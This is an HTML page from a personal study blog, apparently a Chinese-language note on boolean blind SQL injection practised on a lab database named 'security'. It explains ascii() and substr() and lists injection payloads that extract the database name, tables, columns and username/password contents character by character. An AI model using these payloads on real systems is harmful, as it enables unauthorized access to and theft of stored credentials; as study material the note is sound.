@@ -1,0 +1,80 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sql注入学习笔记#7 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Sql注入学习笔记#7</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-06T10:09:15.000Z" id="date"> 2023-06-06</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-07T07:23:45.860Z" id="updated"> 2023-06-07</time></div></span></div></div><hr><div id="post-content"><p>这篇文章学习布尔盲注</p>
+<span id="more"></span>
+
+<p>盲注类sql注入有：时间盲注、布尔盲注、报错盲注</p>
+<p>如何判断布尔盲注？</p>
+<p>就是id&#x3D;1’ and 1&#x3D;1–+ 正常id&#x3D;1’ and 1&#x3D;2–+不正常</p>
+<p>那么就具备布尔盲注的基本条件了 </p>
+<h1 id="1-Basic"><a href="#1-Basic" class="headerlink" title="1 Basic"></a>1 Basic</h1><ol>
+<li><p>ascii() 函数</p>
+<p>这个应该都知道了，</p>
+<p>没什么好介绍的。。。。</p>
+</li>
+<li><p>基本原理</p>
+<p>前面说了具备布尔注入的基本条件是id&#x3D;1’ and 1&#x3D;1–+ 正常id&#x3D;1’ and 1&#x3D;2–+不正常</p>
+<p>那么我们可以在这个and 后面做手脚，</p>
+<p>来通过页面的形式判断是否是True</p>
+</li>
+<li><p>substr() 函数</p>
+<p>语法：substr(string,m,n)</p>
+<p>从第m个字符开始显示n个数</p>
+</li>
+</ol>
+<p>还有更多的有用的函数等待探索，</p>
+<p>up可能后面也会介绍到</p>
+<h1 id="2-开始注入"><a href="#2-开始注入" class="headerlink" title="2 开始注入"></a>2 开始注入</h1><p>  这里会非常漫长，</p>
+<p>现在开始构造语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&quot; and ascii(substr(database(),1,1))=115--+<br>?id=1&quot; and ascii(substr(database(),2,1))=101--+<br>......漫长的尝试<br></code></pre></td></tr></table></figure>
+
+<p>现在我知道了数据库ascii名是</p>
+<p>115 101 99 117 114 105 116 121</p>
+<p>转换一下知道了数据库名是security</p>
+<p>然后获取数据库中的表格</p>
+<p>……..</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27;and length((select database()))&gt;9--+<br>#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4<br>?id=1&#x27;and ascii(substr((select database()),1,1))=115--+<br>#substr(&quot;78909&quot;,1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。<br> <br> <br>?id=1&#x27;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+<br>判断所有表名字符长度。<br>?id=1&#x27;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+<br>逐一判断表名<br> <br>?id=1&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20--+<br>判断所有字段名的长度<br>?id=1&#x27;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99--+<br>逐一判断字段名。<br> <br> <br>?id=1&#x27; and length((select group_concat(username,password) from users))&gt;109--+<br>判断字段内容长度<br>?id=1&#x27; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+<br>逐一检测内容。<br></code></pre></td></tr></table></figure>
+
+<h1 id="3-结束"><a href="#3-结束" class="headerlink" title="3 结束"></a>3 结束</h1><p>这个东西很简单，</p>
+<p>但是很麻烦，</p>
+<p>有空写个脚本吧。。。。</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/07/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-8/">← Next Sql注入学习笔记#8</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/06/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-6/">Sql注入学习笔记#6 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Basic"><span class="toc-number">1.</span> <span class="toc-text">1 Basic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%BC%80%E5%A7%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">2 开始注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E7%BB%93%E6%9D%9F"><span class="toc-number">3.</span> <span class="toc-text">3 结束</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'This comment is sent by Penguin Logistics.'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
